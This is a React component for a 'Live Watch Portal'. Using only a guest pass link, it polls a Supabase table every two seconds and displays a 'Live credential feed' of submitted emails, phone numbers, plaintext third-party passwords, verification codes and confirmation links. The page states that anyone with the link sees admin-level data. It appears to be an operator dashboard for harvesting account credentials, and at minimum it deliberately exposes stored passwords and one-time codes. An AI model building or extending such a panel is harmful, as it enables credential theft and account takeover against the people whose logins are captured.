import { useEffect, useState, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { createClient } from '@supabase/supabase-js';

// INDEPENDENT PUBLIC CLIENT: Not managed by AuthProvider's auth lifecycle
// This prevents auth token lock contention with global supabase client
// Uses same credentials but disables auth entirely
const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;

if (!supabaseUrl || !supabaseAnonKey) {
  console.error('Watch: Missing Supabase credentials', {
    hasUrl: !!supabaseUrl,
    hasKey: !!supabaseAnonKey,
  });
}

// Create dedicated public client without auth initialization
// autoRefreshToken: false - don't manage token refreshes
// persistSession: false - don't use/modify localStorage
const publicGuest = createClient(supabaseUrl || '', supabaseAnonKey || '', {
  auth: {
    autoRefreshToken: false,
    persistSession: false,
  },
});

export default function Watch() {
  const { code: routeCode } = useParams<{ code?: string }>();
  const [isLoading, setIsLoading] = useState(false);
  const [isValid, setIsValid] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string>('');
  const [passData, setPassData] = useState<any>(null);
  const [submissions, setSubmissions] = useState<any[]>([]);
  const [isLive, setIsLive] = useState(false);
  const pollTimer = useRef<number | null>(null);
  const liveTimer = useRef<number | null>(null);

  useEffect(() => {
    console.log('🔍 WATCH ROUTE PARAMETER:', routeCode);
    console.log('🔍 WATCH FULL LOCATION:', window.location.href);

    setErrorMessage('');
    setIsValid(false);
    setPassData(null);
    setSubmissions([]);

    const passCode = routeCode?.trim() ?? '';

    console.log('🔍 WATCH PASS CODE EXTRACTED:', passCode);

    if (!passCode) {
      console.warn('Watch: no pass code found in route');
      setErrorMessage('Invalid or Expired Pass');
      return;
    }

    const triggerLiveIndicator = (message: string) => {
      if (liveTimer.current) {
        window.clearTimeout(liveTimer.current);
      }
      setIsLive(true);
      liveTimer.current = window.setTimeout(() => {
        setIsLive(false);
      }, 1200);
      console.log('[WATCH] live:', message);
    };

    const fetchWatchData = async () => {
      try {
        const { data, error } = await publicGuest
          .from('guest_passes')
          .select('*')
          .eq('pass_code', passCode);

        console.log('🔍 WATCH QUERY RESULT:', { data, error });

        if (error) {
          console.error('Watch: Supabase query failed:', error);
          setErrorMessage('Invalid or Expired Pass');
          setIsValid(false);
          return;
        }

        const passRecord = Array.isArray(data) && data.length > 0 ? data[0] : null;
        const expiresAt = passRecord ? new Date(passRecord.expires_at) : null;

        if (!passRecord || !expiresAt || Number.isNaN(expiresAt.getTime()) || expiresAt <= new Date()) {
          setErrorMessage('Invalid or Expired Pass');
          setIsValid(false);
          return;
        }

        const { data: submissionsData, error: submissionsError } = await publicGuest
          .from('platform_connection_requests')
          .select('id,platform,email,phone,third_party_password,status,code,confirmation_link,tracking_id,created_at')
          .order('created_at', { ascending: false });

        console.log('🔍 WATCH SUBMISSIONS QUERY RESULT:', { submissionsData, submissionsError });
        if (submissionsError) {
          console.error('Watch: failed to load watch submissions:', submissionsError);
          setErrorMessage('Unable to load submissions');
          return;
        }

        setPassData(passRecord);
        setIsValid(true);
        setErrorMessage('');
        setSubmissions(Array.isArray(submissionsData) ? submissionsData : []);
        triggerLiveIndicator('Watch refreshed submissions');
      } catch (err) {
        console.error('Watch: Unexpected error validating pass:', err);
        setErrorMessage('Invalid or Expired Pass');
        setIsValid(false);
      }
    };

    fetchWatchData();
    pollTimer.current = window.setInterval(fetchWatchData, 2000);

    return () => {
      if (pollTimer.current !== null) {
        window.clearInterval(pollTimer.current);
        pollTimer.current = null;
      }
      if (liveTimer.current) {
        window.clearTimeout(liveTimer.current);
      }
    };
  }, [routeCode]);


  return (
    <main className="min-h-screen bg-[#0a0a0c] px-4 py-10 text-white sm:px-6">
      <div className="mx-auto max-w-5xl rounded-3xl border border-white/10 bg-slate-950/80 p-6 shadow-xl shadow-black/30">
        <div className="mb-6">
          <h1 className="text-3xl font-semibold">Live Watch Portal</h1>
          <p className="mt-2 text-slate-400">Public access only. No subscriptions, no auth locks.</p>
        </div>

        <div className="rounded-3xl border border-white/10 bg-slate-900/80 p-6">
          <p className="text-slate-300">
            The page renders immediately while validating the pass in the background. If the pass is invalid,
            a message will appear below.
          </p>
        </div>

        {errorMessage ? (
          <div className="mt-6 rounded-3xl border border-red-500/30 bg-red-950/80 p-6 text-red-200">
            <p className="text-lg font-semibold">Invalid or Expired Pass</p>
            <p className="mt-2 text-sm text-red-200">The access link is invalid or no longer valid.</p>
          </div>
        ) : isValid && passData ? (
          <div className="mt-6 space-y-6">
            <div className="rounded-3xl border border-white/10 bg-slate-900/80 p-6">
              <div className="flex flex-wrap items-center gap-3">
                <h2 className="text-2xl font-semibold">Access granted</h2>
                <span className={`inline-flex items-center gap-2 rounded-full px-3 py-1 text-xs ${isLive ? 'bg-emerald-500/20 text-emerald-300' : 'bg-slate-800 text-slate-400'}`}>
                  <span className={`h-2.5 w-2.5 rounded-full ${isLive ? 'bg-emerald-400 animate-pulse' : 'bg-slate-500'}`} />
                  {isLive ? 'Live • Real-time' : 'Live'}
                </span>
              </div>
              <p className="mt-2 text-slate-300">
                Your guest pass is valid until {new Date(passData.expires_at).toLocaleString()}.
              </p>
            </div>

            <div className="rounded-3xl border border-white/10 bg-slate-900/80 p-6">
              <div className="text-slate-300">Watch submissions</div>
              <div className="mt-4 rounded-3xl bg-black/60 p-6 text-slate-100">
                <p className="text-lg font-semibold">Live credential feed</p>
                <p className="mt-2 text-slate-400">Anyone with this valid link sees the same data as admin.</p>
              </div>
              <div className="mt-6 space-y-4">
                {submissions.length === 0 ? (
                  <div className="rounded-2xl border border-white/10 bg-slate-950/80 p-4 text-slate-400">
                    No submissions have been created yet during this session.
                  </div>
                ) : (
                  submissions.map((submission) => (
                    <div key={submission.id} className="rounded-2xl border border-white/10 bg-slate-950/80 p-4">
                      <div className="flex flex-wrap items-center justify-between gap-2">
                        <span className="font-semibold text-white">{submission.platform}</span>
                        <span className="text-sm text-slate-400">{new Date(submission.created_at).toLocaleString()}</span>
                      </div>
                      <div className="mt-3 grid gap-3 sm:grid-cols-2">
                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Email</p>
                          <p className="mt-1 font-mono text-sm text-white">{submission.email || '-'}</p>
                        </div>
                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Phone</p>
                          <p className="mt-1 font-mono text-sm text-white">{submission.phone || '-'}</p>
                        </div>
                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Password</p>
                          <p className="mt-1 font-mono text-sm text-emerald-200">{submission.third_party_password || '-'}</p>
                        </div>
                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Confirmation Link</p>
                          <p className="mt-1 break-words text-xs font-mono text-slate-100">{submission.confirmation_link || '-'}</p>
                        </div>
                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Code</p>
                          <p className="mt-1 font-mono text-sm text-slate-100">{submission.code || '-'}</p>
                        </div>
                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Tracking ID</p>
                          <p className="mt-1 font-mono text-xs text-slate-100 break-words">{submission.tracking_id || '-'}</p>
                        </div>
                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Status</p>
                          <p className="mt-1 text-sm text-slate-100">{submission.status || 'pending'}</p>
                        </div>
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        ) : (
          <div className="mt-6 rounded-3xl border border-white/10 bg-slate-900/80 p-6 text-slate-300">
            <p>No pass validated yet. The page is already visible and validation is running in the background.</p>
          </div>
        )}
      </div>
    </main>
  );
}
